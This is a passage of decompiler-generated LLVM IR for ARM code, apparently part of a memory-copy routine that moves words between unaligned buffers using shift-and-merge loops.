  %v0_18528 = phi i32 [ %v0_18528.pre, %dec_label_pc_18524.dec_label_pc_18524_crit_edge ], [ %v4_18498, %dec_label_pc_1851c ]
  %v0_18524 = phi i32 [ %v0_18524.pre, %dec_label_pc_18524.dec_label_pc_18524_crit_edge ], [ %v2_18498, %dec_label_pc_1851c ]
  %v3_18524 = udiv i32 %v0_18524, 65536
  store i32 %v3_18524, i32* %r3.global-to-local, align 4
  %v1_18528 = inttoptr i32 %v0_18528 to i32*
  %v2_18528 = load i32, i32* %v1_18528, align 4
  store i32 %v2_18528, i32* %r4.global-to-local, align 4
  %v3_18528 = add i32 %v0_18528, 4
  %v4_18528 = inttoptr i32 %v3_18528 to i32*
  %v5_18528 = load i32, i32* %v4_18528, align 4
  store i32 %v5_18528, i32* %r5.global-to-local, align 4
  %v6_18528 = add i32 %v0_18528, 8
  %v7_18528 = inttoptr i32 %v6_18528 to i32*
  %v8_18528 = load i32, i32* %v7_18528, align 4
  store i32 %v8_18528, i32* %ip.global-to-local, align 4
  %v9_18528 = add i32 %v0_18528, 12
  %v10_18528 = inttoptr i32 %v9_18528 to i32*
  %v11_18528 = load i32, i32* %v10_18528, align 4
  store i32 %v11_18528, i32* @lr, align 4
  %v12_18528 = add i32 %v0_18528, 16
  store i32 %v12_18528, i32* %r1.global-to-local, align 4
  %v4_1852c = mul i32 %v2_18528, 65536
  %v5_1852c = or i32 %v4_1852c, %v3_18524
  store i32 %v5_1852c, i32* %r3.global-to-local, align 4
  %v3_18530 = udiv i32 %v2_18528, 65536
  %v4_18534 = mul i32 %v5_18528, 65536
  %v5_18534 = or i32 %v4_18534, %v3_18530
  store i32 %v5_18534, i32* %r4.global-to-local, align 4
  %v3_18538 = udiv i32 %v5_18528, 65536
  %v4_1853c = mul i32 %v8_18528, 65536
  %v5_1853c = or i32 %v4_1853c, %v3_18538
  store i32 %v5_1853c, i32* %r5.global-to-local, align 4
  %v3_18540 = udiv i32 %v8_18528, 65536
  %v4_18544 = mul i32 %v11_18528, 65536
  %v5_18544 = or i32 %v4_18544, %v3_18540
  store i32 %v5_18544, i32* @ip, align 4
  %v1_18548 = inttoptr i32 %v0_18548 to i32*
  store i32 %v5_1852c, i32* %v1_18548, align 4
  %v3_18548 = add i32 %v0_18548, 4
  %v4_18548 = inttoptr i32 %v3_18548 to i32*
  %v5_18548 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_18548, i32* %v4_18548, align 4
  %v6_18548 = add i32 %v0_18548, 8
  %v7_18548 = inttoptr i32 %v6_18548 to i32*
  %v8_18548 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_18548, i32* %v7_18548, align 4
  %v9_18548 = add i32 %v0_18548, 12
  %v10_18548 = inttoptr i32 %v9_18548 to i32*
  %v11_18548 = load i32, i32* @ip, align 4
  store i32 %v11_18548, i32* %v10_18548, align 4
  %v12_18548 = add i32 %v0_18548, 16
  store i32 %v12_18548, i32* %r0.global-to-local, align 4
  %v0_1854c = load i32, i32* %r2.global-to-local, align 4
  %v2_1854c = add i32 %v0_1854c, -16
  store i32 %v2_1854c, i32* %r2.global-to-local, align 4
  %v6_18550 = icmp slt i32 %v0_1854c, 16
  br i1 %v6_18550, label %dec_label_pc_18554, label %dec_label_pc_18524.dec_label_pc_18524_crit_edge

dec_label_pc_18524.dec_label_pc_18524_crit_edge:  ; preds = %dec_label_pc_18524
  %v0_18524.pre = load i32, i32* @lr, align 4
  %v0_18528.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18524

dec_label_pc_18554:                               ; preds = %dec_label_pc_18524
  %v2_18554 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18554, i32* @r4, align 4
  %v5_18554 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18554, i32* @r5, align 4
  %v2_18558 = add i32 %v0_1854c, -4
  store i32 %v2_18558, i32* %r2.global-to-local, align 4
  %v4_18558 = add i32 %v0_1854c, 2147483632
  %v5_18558 = and i32 %v2_18558, %v4_18558
  %v6_18558 = icmp slt i32 %v5_18558, 0
  store i1 %v6_18558, i1* %cpsr_v.global-to-local, align 1
  %v7_18558 = icmp slt i32 %v2_18558, 0
  store i1 %v7_18558, i1* %cpsr_n.global-to-local, align 1
  %v5_1855c = icmp slt i32 %v2_1854c, -12
  br i1 %v5_1855c, label %dec_label_pc_18578, label %dec_label_pc_18560

dec_label_pc_18560:                               ; preds = %dec_label_pc_18554, %dec_label_pc_18514, %dec_label_pc_18560
  %v1_1856c = phi i32 [ %v4_1856c, %dec_label_pc_18560 ], [ %v12_18548, %dec_label_pc_18554 ], [ %v0_184dc75, %dec_label_pc_18514 ]
  %v0_18560 = load i32, i32* @lr, align 4
  %v3_18560 = udiv i32 %v0_18560, 65536
  store i32 %v3_18560, i32* %ip.global-to-local, align 4
  %v0_18564 = load i32, i32* %r1.global-to-local, align 4
  %v1_18564 = inttoptr i32 %v0_18564 to i32*
  %v2_18564 = load i32, i32* %v1_18564, align 4
  store i32 %v2_18564, i32* @lr, align 4
  %v4_18564 = add i32 %v0_18564, 4
  store i32 %v4_18564, i32* %r1.global-to-local, align 4
  %v4_18568 = mul i32 %v2_18564, 65536
  %v5_18568 = or i32 %v4_18568, %v3_18560
  store i32 %v5_18568, i32* @ip, align 4
  %v2_1856c = inttoptr i32 %v1_1856c to i32*
  store i32 %v5_18568, i32* %v2_1856c, align 4
  %v3_1856c = load i32, i32* %r0.global-to-local, align 4
  %v4_1856c = add i32 %v3_1856c, 4
  store i32 %v4_1856c, i32* %r0.global-to-local, align 4
  %v0_18570 = load i32, i32* %r2.global-to-local, align 4
  %v2_18570 = add i32 %v0_18570, -4
  store i32 %v2_18570, i32* %r2.global-to-local, align 4
  %v6_18574 = icmp slt i32 %v0_18570, 4
  br i1 %v6_18574, label %dec_label_pc_18578.loopexit, label %dec_label_pc_18560

dec_label_pc_18578.loopexit:                      ; preds = %dec_label_pc_18560
  %v4_18570 = sub i32 3, %v0_18570
  %v5_18570 = and i32 %v4_18570, %v0_18570
  %v6_18570 = icmp slt i32 %v5_18570, 0
  %v7_18570 = icmp slt i32 %v2_18570, 0
  store i1 %v6_18570, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18570, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18578

dec_label_pc_18578:                               ; preds = %dec_label_pc_18578.loopexit, %dec_label_pc_18554
  %v2_1844c112 = phi i32 [ %v4_1856c, %dec_label_pc_18578.loopexit ], [ %v12_18548, %dec_label_pc_18554 ]
  %v0_1843c108 = phi i32 [ %v2_18570, %dec_label_pc_18578.loopexit ], [ %v2_18558, %dec_label_pc_18554 ]
  %v0_18578 = load i32, i32* %r1.global-to-local, align 4
  %v1_18578 = add i32 %v0_18578, -2
  store i32 %v1_18578, i32* @r1, align 4
  br label %bb133

dec_label_pc_18580:                               ; preds = %dec_label_pc_18494
  br i1 %v5_18584, label %dec_label_pc_185cc, label %dec_label_pc_18588

dec_label_pc_18588:                               ; preds = %dec_label_pc_18580
  store i32 %v2_18580, i32* %r2.global-to-local, align 4
  %v3_1858c = load i32, i32* @r4, align 4
  store i32 %v3_1858c, i32* %stack_var_-16, align 4
  %v6_1858c = load i32, i32* @r5, align 4
  store i32 %v6_1858c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %dec_label_pc_18590.dec_label_pc_18590_crit_edge, %dec_label_pc_18588
  %v0_185b4 = phi i32 [ %v12_185b4, %dec_label_pc_18590.dec_label_pc_18590_crit_edge ], [ %v0_184dc75, %dec_label_pc_18588 ]
  %v0_18594 = phi i32 [ %v0_18594.pre, %dec_label_pc_18590.dec_label_pc_18590_crit_edge ], [ %v4_18498, %dec_label_pc_18588 ]
  %v0_18590 = phi i32 [ %v0_18590.pre, %dec_label_pc_18590.dec_label_pc_18590_crit_edge ], [ %v2_18498, %dec_label_pc_18588 ]
  %v3_18590 = udiv i32 %v0_18590, 16777216
  store i32 %v3_18590, i32* %r3.global-to-local, align 4
  %v1_18594 = inttoptr i32 %v0_18594 to i32*
  %v2_18594 = load i32, i32* %v1_18594, align 4
  store i32 %v2_18594, i32* %r4.global-to-local, align 4
  %v3_18594 = add i32 %v0_18594, 4
  %v4_18594 = inttoptr i32 %v3_18594 to i32*
  %v5_18594 = load i32, i32* %v4_18594, align 4
  store i32 %v5_18594, i32* %r5.global-to-local, align 4
  %v6_18594 = add i32 %v0_18594, 8
  %v7_18594 = inttoptr i32 %v6_18594 to i32*
  %v8_18594 = load i32, i32* %v7_18594, align 4
  store i32 %v8_18594, i32* %ip.global-to-local, align 4
  %v9_18594 = add i32 %v0_18594, 12
  %v10_18594 = inttoptr i32 %v9_18594 to i32*
  %v11_18594 = load i32, i32* %v10_18594, align 4
  store i32 %v11_18594, i32* @lr, align 4
  %v12_18594 = add i32 %v0_18594, 16
  store i32 %v12_18594, i32* %r1.global-to-local, align 4
  %v4_18598 = mul i32 %v2_18594, 256
  %v5_18598 = or i32 %v4_18598, %v3_18590
  store i32 %v5_18598, i32* %r3.global-to-local, align 4
  %v3_1859c = udiv i32 %v2_18594, 16777216
  %v4_185a0 = mul i32 %v5_18594, 256
  %v5_185a0 = or i32 %v4_185a0, %v3_1859c
  store i32 %v5_185a0, i32* %r4.global-to-local, align 4
  %v3_185a4 = udiv i32 %v5_18594, 16777216
  %v4_185a8 = mul i32 %v8_18594, 256
  %v5_185a8 = or i32 %v4_185a8, %v3_185a4
  store i32 %v5_185a8, i32* %r5.global-to-local, align 4
  %v3_185ac = udiv i32 %v8_18594, 16777216
  %v4_185b0 = mul i32 %v11_18594, 256
  %v5_185b0 = or i32 %v4_185b0, %v3_185ac
  store i32 %v5_185b0, i32* @ip, align 4
  %v1_185b4 = inttoptr i32 %v0_185b4 to i32*
  store i32 %v5_18598, i32* %v1_185b4, align 4
  %v3_185b4 = add i32 %v0_185b4, 4
  %v4_185b4 = inttoptr i32 %v3_185b4 to i32*
  %v5_185b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_185b4, i32* %v4_185b4, align 4
  %v6_185b4 = add i32 %v0_185b4, 8
  %v7_185b4 = inttoptr i32 %v6_185b4 to i32*
  %v8_185b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_185b4, i32* %v7_185b4, align 4
  %v9_185b4 = add i32 %v0_185b4, 12
  %v10_185b4 = inttoptr i32 %v9_185b4 to i32*
  %v11_185b4 = load i32, i32* @ip, align 4
  store i32 %v11_185b4, i32* %v10_185b4, align 4
  %v12_185b4 = add i32 %v0_185b4, 16
  store i32 %v12_185b4, i32* %r0.global-to-local, align 4
  %v0_185b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_185b8 = add i32 %v0_185b8, -16
  store i32 %v2_185b8, i32* %r2.global-to-local, align 4
  %v6_185bc = icmp slt i32 %v0_185b8, 16
  br i1 %v6_185bc, label %dec_label_pc_185c0, label %dec_label_pc_18590.dec_label_pc_18590_crit_edge

dec_label_pc_18590.dec_label_pc_18590_crit_edge:  ; preds = %dec_label_pc_18590
  %v0_18590.pre = load i32, i32* @lr, align 4
  %v0_18594.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18590

dec_label_pc_185c0:                               ; preds = %dec_label_pc_18590
  %v2_185c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_185c0, i32* @r4, align 4
  %v5_185c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_185c0, i32* @r5, align 4
  %v2_185c4 = add i32 %v0_185b8, -4
  store i32 %v2_185c4, i32* %r2.global-to-local, align 4
  %v4_185c4 = add i32 %v0_185b8, 2147483632
  %v5_185c4 = and i32 %v2_185c4, %v4_185c4
  %v6_185c4 = icmp slt i32 %v5_185c4, 0
  store i1 %v6_185c4, i1* %cpsr_v.global-to-local, align 1
  %v7_185c4 = icmp slt i32 %v2_185c4, 0
  store i1 %v7_185c4, i1* %cpsr_n.global-to-local, align 1
  %v5_185c8 = icmp slt i32 %v2_185b8, -12
  br i1 %v5_185c8, label %dec_label_pc_185e4, label %dec_label_pc_185cc

dec_label_pc_185cc:                               ; preds = %dec_label_pc_185c0, %dec_label_pc_18580, %dec_label_pc_185cc
  %v1_185d8 = phi i32 [ %v4_185d8, %dec_label_pc_185cc ], [ %v12_185b4, %dec_label_pc_185c0 ], [ %v0_184dc75, %dec_label_pc_18580 ]
  %v0_185cc = load i32, i32* @lr, align 4
  %v3_185cc = udiv i32 %v0_185cc, 16777216
  store i32 %v3_185cc, i32* %ip.global-to-local, align 4
  %v0_185d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_185d0 = inttoptr i32 %v0_185d0 to i32*
  %v2_185d0 = load i32, i32* %v1_185d0, align 4
  store i32 %v2_185d0, i32* @lr, align 4
  %v4_185d0 = add i32 %v0_185d0, 4
  store i32 %v4_185d0, i32* %r1.global-to-local, align 4
  %v4_185d4 = mul i32 %v2_185d0, 256
  %v5_185d4 = or i32 %v4_185d4, %v3_185cc
  store i32 %v5_185d4, i32* @ip, align 4
  %v2_185d8 = inttoptr i32 %v1_185d8 to i32*
  store i32 %v5_185d4, i32* %v2_185d8, align 4
  %v3_185d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_185d8 = add i32 %v3_185d8, 4
  store i32 %v4_185d8, i32* %r0.global-to-local, align 4
  %v0_185dc = load i32, i32* %r2.global-to-local, align 4
  %v2_185dc = add i32 %v0_185dc, -4
  store i32 %v2_185dc, i32* %r2.global-to-local, align 4
  %v6_185e0 = icmp slt i32 %v0_185dc, 4
  br i1 %v6_185e0, label %dec_label_pc_185e4.loopexit, label %dec_label_pc_185cc

dec_label_pc_185e4.loopexit:                      ; preds = %dec_label_pc_185cc
  %v4_185dc = sub i32 3, %v0_185dc
  %v5_185dc = and i32 %v4_185dc, %v0_185dc
  %v6_185dc = icmp slt i32 %v5_185dc, 0
  %v7_185dc = icmp slt i32 %v2_185dc, 0
  store i1 %v6_185dc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_185dc, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_185e4

dec_label_pc_185e4:                               ; preds = %dec_label_pc_185e4.loopexit, %dec_label_pc_185c0
  %v2_1844c114 = phi i32 [ %v4_185d8, %dec_label_pc_185e4.loopexit ], [ %v12_185b4, %dec_label_pc_185c0 ]
  %v0_1843c110 = phi i32 [ %v2_185dc, %dec_label_pc_185e4.loopexit ], [ %v2_185c4, %dec_label_pc_185c0 ]
  %v0_185e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_185e4 = add i32 %v0_185e4, -1
  store i32 %v1_185e4, i32* @r1, align 4
  br label %bb133

dec_label_pc_185ec:                               ; preds = %entry
  %v1_185ec = load i32, i32* @r2, align 4
  %v2_185ec = add i32 %v1_185ec, %v0_183a0
  store i32 %v2_185ec, i32* @r1, align 4
  %v2_185f0 = add i32 %v1_185ec, %v1_183a0
  store i32 %v2_185f0, i32* %r0.global-to-local, align 4
  %v2_185f4 = add i32 %v1_185ec, -4
  store i32 %v2_185f4, i32* %r2.global-to-local, align 4
  %v4_185f4 = sub i32 3, %v1_185ec
  %v5_185f4 = and i32 %v4_185f4, %v1_185ec
  %v6_185f4 = icmp slt i32 %v5_185f4, 0
  store i1 %v6_185f4, i1* %cpsr_v.global-to-local, align 1
  %v7_185f4 = icmp slt i32 %v2_185f4, 0
  store i1 %v7_185f4, i1* %cpsr_n.global-to-local, align 1
  %v5_185f8 = icmp slt i32 %v1_185ec, 4
  br i1 %v5_185f8, label %bb143, label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %dec_label_pc_185ec
  %v1_185fc = urem i32 %v2_185f0, 4
  store i32 %v1_185fc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_185fc = icmp eq i32 %v1_185fc, 0
  br i1 %v2_185fc, label %dec_label_pc_18604, label %dec_label_pc_186a4

dec_label_pc_18604:                               ; preds = %dec_label_pc_185fc
  %v1_18604 = urem i32 %v2_185ec, 4
  store i32 %v1_18604, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18604 = icmp eq i32 %v1_18604, 0
  br i1 %v2_18604, label %dec_label_pc_1860c, label %dec_label_pc_186d0

dec_label_pc_1860c:                               ; preds = %dec_label_pc_18604, %dec_label_pc_186c8
  %v0_1862449 = phi i32 [ %v2_185f0, %dec_label_pc_18604 ], [ %v0_1871832, %dec_label_pc_186c8 ]
  %v0_1862048 = phi i32 [ %v2_185ec, %dec_label_pc_18604 ], [ %v0_186c8, %dec_label_pc_186c8 ]
  %v0_1860c = phi i32 [ %v2_185f4, %dec_label_pc_18604 ], [ %v2_186c0, %dec_label_pc_186c8 ]
  %v2_1860c = add i32 %v0_1860c, -8
  store i32 %v2_1860c, i32* %r2.global-to-local, align 4
  %v4_1860c = sub i32 7, %v0_1860c
  %v5_1860c = and i32 %v4_1860c, %v0_1860c
  %v6_1860c = icmp slt i32 %v5_1860c, 0
  store i1 %v6_1860c, i1* %cpsr_v.global-to-local, align 1
  %v7_1860c = icmp slt i32 %v2_1860c, 0
  store i1 %v7_1860c, i1* %cpsr_n.global-to-local, align 1
  %v5_18610 = icmp slt i32 %v0_1860c, 8
  br i1 %v5_18610, label %dec_label_pc_1865c, label %dec_label_pc_18614

dec_label_pc_18614:                               ; preds = %dec_label_pc_1860c
  %v3_18614 = load i32, i32* @r4, align 4
  %v5_18614 = inttoptr i32 %v3_18614 to i8*
  store i8* %v5_18614, i8** %stack_var_-8, align 4
  %v8_18614 = load i32, i32* @lr, align 4
  %v2_18618 = add i32 %v0_1860c, -28
  store i32 %v2_18618, i32* %r2.global-to-local, align 4
  %v4_18618 = sub i32 27, %v0_1860c
  %v5_18618 = and i32 %v4_18618, %v2_1860c
  %v6_18618 = icmp slt i32 %v5_18618, 0
  store i1 %v6_18618, i1* %cpsr_v.global-to-local, align 1
  %v7_18618 = icmp slt i32 %v2_18618, 0
  store i1 %v7_18618, i1* %cpsr_n.global-to-local, align 1
  %v5_1861c = icmp slt i32 %v2_1860c, 20
  br i1 %v5_1861c, label %dec_label_pc_18638, label %dec_label_pc_18620

dec_label_pc_18620:                               ; preds = %dec_label_pc_18614, %dec_label_pc_18620.dec_label_pc_18620_crit_edge
  %v0_18624 = phi i32 [ %v1_1862c, %dec_label_pc_18620.dec_label_pc_18620_crit_edge ], [ %v0_1862449, %dec_label_pc_18614 ]
  %v0_18620 = phi i32 [ %v0_18620.pre, %dec_label_pc_18620.dec_label_pc_18620_crit_edge ], [ %v0_1862048, %dec_label_pc_18614 ]
  %v1_18620 = add i32 %v0_18620, -4
  %v2_18620 = inttoptr i32 %v1_18620 to i32*
  %v3_18620 = load i32, i32* %v2_18620, align 4
  store i32 %v3_18620, i32* %r3.global-to-local, align 4
  %v4_18620 = add i32 %v0_18620, -8
  %v5_18620 = inttoptr i32 %v4_18620 to i32*
  %v6_18620 = load i32, i32* %v5_18620, align 4
  store i32 %v6_18620, i32* %r4.global-to-local, align 4
  %v7_18620 = add i32 %v0_18620, -12
  %v8_18620 = inttoptr i32 %v7_18620 to i32*
  %v9_18620 = load i32, i32* %v8_18620, align 4
  store i32 %v9_18620, i32* %ip.global-to-local, align 4
  %v10_18620 = add i32 %v0_18620, -16
  %v11_18620 = inttoptr i32 %v10_18620 to i32*
  %v12_18620 = load i32, i32* %v11_18620, align 4
  store i32 %v12_18620, i32* %lr.global-to-local, align 4
  store i32 %v10_18620, i32* %r1.global-to-local, align 4
  %v1_18624 = add i32 %v0_18624, -16
  %v2_18624 = inttoptr i32 %v1_18624 to i32*
  store i32 %v3_18620, i32* %v2_18624, align 4
  %v4_18624 = add i32 %v0_18624, -12
  %v5_18624 = inttoptr i32 %v4_18624 to i32*
  %v6_18624 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_18624, i32* %v5_18624, align 4
  %v7_18624 = add i32 %v0_18624, -8
  %v8_18624 = inttoptr i32 %v7_18624 to i32*
  %v9_18624 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_18624, i32* %v8_18624, align 4
  %v10_18624 = add i32 %v0_18624, -4
  %v11_18624 = inttoptr i32 %v10_18624 to i32*
  %v12_18624 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_18624, i32* %v11_18624, align 4
  store i32 %v1_18624, i32* %r0.global-to-local, align 4
  %v0_18628 = load i32, i32* %r1.global-to-local, align 4
  %v1_18628 = add i32 %v0_18628, -4
  %v2_18628 = inttoptr i32 %v1_18628 to i32*
  %v3_18628 = load i32, i32* %v2_18628, align 4
  store i32 %v3_18628, i32* %r3.global-to-local, align 4
  %v4_18628 = add i32 %v0_18628, -8
  %v5_18628 = inttoptr i32 %v4_18628 to i32*
  %v6_18628 = load i32, i32* %v5_18628, align 4
  store i32 %v6_18628, i32* %r4.global-to-local, align 4
  %v7_18628 = add i32 %v0_18628, -12
  %v8_18628 = inttoptr i32 %v7_18628 to i32*
  %v9_18628 = load i32, i32* %v8_18628, align 4
  store i32 %v9_18628, i32* @ip, align 4
  %v10_18628 = add i32 %v0_18628, -16
  %v11_18628 = inttoptr i32 %v10_18628 to i32*
  %v12_18628 = load i32, i32* %v11_18628, align 4
  store i32 %v12_18628, i32* %lr.global-to-local, align 4
  store i32 %v10_18628, i32* @r1, align 4
  %v1_1862c = add i32 %v0_18624, -32
  %v2_1862c = inttoptr i32 %v1_1862c to i32*
  store i32 %v3_18628, i32* %v2_1862c, align 4
  %v4_1862c = add i32 %v0_18624, -28
  %v5_1862c = inttoptr i32 %v4_1862c to i32*
  %v6_1862c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1862c, i32* %v5_1862c, align 4
  %v7_1862c = add i32 %v0_18624, -24
  %v8_1862c = inttoptr i32 %v7_1862c to i32*
  %v9_1862c = load i32, i32* @ip, align 4
  store i32 %v9_1862c, i32* %v8_1862c, align 4
  %v10_1862c = add i32 %v0_18624, -20
  %v11_1862c = inttoptr i32 %v10_1862c to i32*
  %v12_1862c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1862c, i32* %v11_1862c, align 4
  store i32 %v1_1862c, i32* %r0.global-to-local, align 4
  %v0_18630 = load i32, i32* %r2.global-to-local, align 4
  %v2_18630 = add i32 %v0_18630, -32
  store i32 %v2_18630, i32* %r2.global-to-local, align 4
  %v6_18634 = icmp slt i32 %v0_18630, 32
  br i1 %v6_18634, label %dec_label_pc_18638.loopexit, label %dec_label_pc_18620.dec_label_pc_18620_crit_edge

dec_label_pc_18620.dec_label_pc_18620_crit_edge:  ; preds = %dec_label_pc_18620
  %v0_18620.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18620

dec_label_pc_18638.loopexit:                      ; preds = %dec_label_pc_18620
  %v4_18630 = sub i32 31, %v0_18630
  %v5_18630 = and i32 %v4_18630, %v0_18630
  %v6_18630 = icmp slt i32 %v5_18630, 0
  %v7_18630 = icmp slt i32 %v2_18630, 0
  store i1 %v6_18630, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_18630, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_18638

dec_label_pc_18638:                               ; preds = %dec_label_pc_18638.loopexit, %dec_label_pc_18614
  %v6_18640 = phi i32 [ %v1_1862c, %dec_label_pc_18638.loopexit ], [ %v0_1862449, %dec_label_pc_18614 ]
  %v0_18648.pr = phi i32 [ %v2_18630, %dec_label_pc_18638.loopexit ], [ %v2_18618, %dec_label_pc_18614 ]
  %v4_18638 = add i32 %v0_18648.pr, 16
  %v6_18638 = sub i32 0, %v0_18648.pr
  %v7_18638 = and i32 %v4_18638, %v6_18638
  %v8_18638 = icmp slt i32 %v7_18638, 0
  store i1 %v8_18638, i1* %cpsr_v.global-to-local, align 1
  %v9_18638 = icmp slt i32 %v4_18638, 0
  store i1 %v9_18638, i1* %cpsr_n.global-to-local, align 1
  %v5_1863c = icmp slt i32 %v0_18648.pr, -16
  br i1 %v5_1863c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_18638
  %v6_1863c = load i32, i32* @r1, align 4
  %v7_1863c = add i32 %v6_1863c, -4
  %v8_1863c = inttoptr i32 %v7_1863c to i32*
  %v9_1863c = load i32, i32* %v8_1863c, align 4
  store i32 %v9_1863c, i32* %r3.global-to-local, align 4
  %v10_1863c = add i32 %v6_1863c, -8
  %v11_1863c = inttoptr i32 %v10_1863c to i32*
  %v12_1863c = load i32, i32* %v11_1863c, align 4
  store i32 %v12_1863c, i32* %r4.global-to-local, align 4
  %v13_1863c = add i32 %v6_1863c, -12
  %v14_1863c = inttoptr i32 %v13_1863c to i32*
  %v15_1863c = load i32, i32* %v14_1863c, align 4
  store i32 %v15_1863c, i32* @ip, align 4
  %v16_1863c = add i32 %v6_1863c, -16
  %v17_1863c = inttoptr i32 %v16_1863c to i32*
  %v18_1863c = load i32, i32* %v17_1863c, align 4
  store i32 %v18_1863c, i32* %lr.global-to-local, align 4
  store i32 %v16_1863c, i32* @r1, align 4
  %v7_18640 = add i32 %v6_18640, -16
  %v8_18640 = inttoptr i32 %v7_18640 to i32*
  store i32 %v9_1863c, i32* %v8_18640, align 4
  %v10_18640 = add i32 %v6_18640, -12
  %v11_18640 = inttoptr i32 %v10_18640 to i32*
  %v12_18640 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_18640, i32* %v11_18640, align 4
  %v13_18640 = add i32 %v6_18640, -8
  %v14_18640 = inttoptr i32 %v13_18640 to i32*
  %v15_18640 = load i32, i32* @ip, align 4
  store i32 %v15_18640, i32* %v14_18640, align 4
  %v16_18640 = add i32 %v6_18640, -4
  %v17_18640 = inttoptr i32 %v16_18640 to i32*
  %v18_18640 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_18640, i32* %v17_18640, align 4
  store i32 %v7_18640, i32* %r0.global-to-local, align 4
  %v6_18644 = load i32, i32* %r2.global-to-local, align 4
  %v7_18644 = add i32 %v6_18644, -16
  store i32 %v7_18644, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_18638, %bb140
  %v6_18650 = phi i32 [ %v7_18640, %bb140 ], [ %v6_18640, %dec_label_pc_18638 ]
  %v0_18648 = phi i32 [ %v7_18644, %bb140 ], [ %v0_18648.pr, %dec_label_pc_18638 ]
  %v4_18648 = add i32 %v0_18648, 20
  store i32 %v4_18648, i32* %r2.global-to-local, align 4
  %v6_18648 = sub i32 0, %v0_18648
  %v7_18648 = and i32 %v4_18648, %v6_18648
  %v8_18648 = icmp slt i32 %v7_18648, 0
  store i1 %v8_18648, i1* %cpsr_v.global-to-local, align 1
  %v9_18648 = icmp slt i32 %v4_18648, 0
  store i1 %v9_18648, i1* %cpsr_n.global-to-local, align 1
  %v5_1864c = icmp slt i32 %v0_18648, -20
  br i1 %v5_1864c, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_1864c = load i32, i32* @r1, align 4
  %v7_1864c = add i32 %v6_1864c, -4
  %v8_1864c = inttoptr i32 %v7_1864c to i32*
  %v9_1864c = load i32, i32* %v8_1864c, align 4
  store i32 %v9_1864c, i32* %r3.global-to-local, align 4
  %v10_1864c = add i32 %v6_1864c, -8
  %v11_1864c = inttoptr i32 %v10_1864c to i32*
  %v12_1864c = load i32, i32* %v11_1864c, align 4
  store i32 %v12_1864c, i32* @ip, align 4
  %v13_1864c = add i32 %v6_1864c, -12
  %v14_1864c = inttoptr i32 %v13_1864c to i32*
  %v15_1864c = load i32, i32* %v14_1864c, align 4
  store i32 %v15_1864c, i32* %lr.global-to-local, align 4
  store i32 %v13_1864c, i32* @r1, align 4
  %v7_18650 = add i32 %v6_18650, -12
  %v8_18650 = inttoptr i32 %v7_18650 to i32*
  store i32 %v9_1864c, i32* %v8_18650, align 4
  %v10_18650 = add i32 %v6_18650, -8
  %v11_18650 = inttoptr i32 %v10_18650 to i32*
  %v12_18650 = load i32, i32* @ip, align 4
  store i32 %v12_18650, i32* %v11_18650, align 4
  %v13_18650 = add i32 %v6_18650, -4
  %v14_18650 = inttoptr i32 %v13_18650 to i32*
  %v15_18650 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_18650, i32* %v14_18650, align 4
  store i32 %v7_18650, i32* %r0.global-to-local, align 4
  %v6_18654 = load i32, i32* %r2.global-to-local, align 4
  %v7_18654 = add i32 %v6_18654, -12
  store i32 %v7_18654, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_1867457 = phi i32 [ %v6_18650, %.thread14 ], [ %v7_18650, %bb141 ]
  %v0_1865c55 = phi i32 [ %v4_18648, %.thread14 ], [ %v7_18654, %bb141 ]
  %v2_18658 = load i8*, i8** %stack_var_-8, align 4
  %v3_18658 = ptrtoint i8* %v2_18658 to i32
  store i32 %v3_18658, i32* @r4, align 4
  store i32 %v8_18614, i32* @lr, align 4
  br label %dec_label_pc_1865c

dec_label_pc_1865c:                               ; preds = %dec_label_pc_1860c, %.thread16
  %v7_1866c = phi i32 [ %v0_1862449, %dec_label_pc_1860c ], [ %v6_1867457, %.thread16 ]
  %v0_1865c = phi i32 [ %v2_1860c, %dec_label_pc_1860c ], [ %v0_1865c55, %.thread16 ]
  %v2_1865c = add i32 %v0_1865c, 8
  store i32 %v2_1865c, i32* %r2.global-to-local, align 4
  %v4_1865c = sub i32 0, %v0_1865c
  %v5_1865c = and i32 %v2_1865c, %v4_1865c
  %v6_1865c = icmp slt i32 %v5_1865c, 0
  store i1 %v6_1865c, i1* %cpsr_v.global-to-local, align 1
  %v7_1865c = icmp slt i32 %v2_1865c, 0
  store i1 %v7_1865c, i1* %cpsr_n.global-to-local, align 1
